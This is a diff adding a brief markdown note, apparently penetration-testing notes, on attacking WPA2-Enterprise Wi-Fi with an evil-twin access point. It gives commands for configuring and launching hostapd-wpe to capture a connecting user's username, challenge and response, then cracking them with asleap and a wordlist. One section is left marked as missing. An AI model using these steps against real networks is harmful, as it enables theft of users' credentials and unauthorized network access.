@@ -1,0 +1,37 @@
+There are two ways to hack WPA2/Enterprise:
+* Evil Twin Attack with Fake Open Authentication Login
+* Evil Twin Attack with WPA/WPA2 Enterprise network
+
+
+### Fake Open Authentication Login (MISSING, probably with hostapd)
+
+### Fake WPA/WPA2 Enterprise network
+
+We can use hostapd-wpe, we want to change the configuration of hostapd, by
+doing:
+```sh
+vim /etc/hostapd-wpe/hostapd-wpe.conf
+```
+Here we want to modify:
+* Interface name
+* SSID
+
+Now we can do:
+```sh
+service network-manager stop # to stop NetworkManager
+```
+
+and then launch hostapd-wpe by doing:
+```sh
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+```
+
+Now once the user connects, we are able to capture its username, its challenge
+and its response.
+
+Now we are going to use a dictionary attack, we can use asleap to do this, by
+doing:
+
+```sh
+asleap -C <challenge> -R <response> -W </path/to/pwordlist.txt>
+```
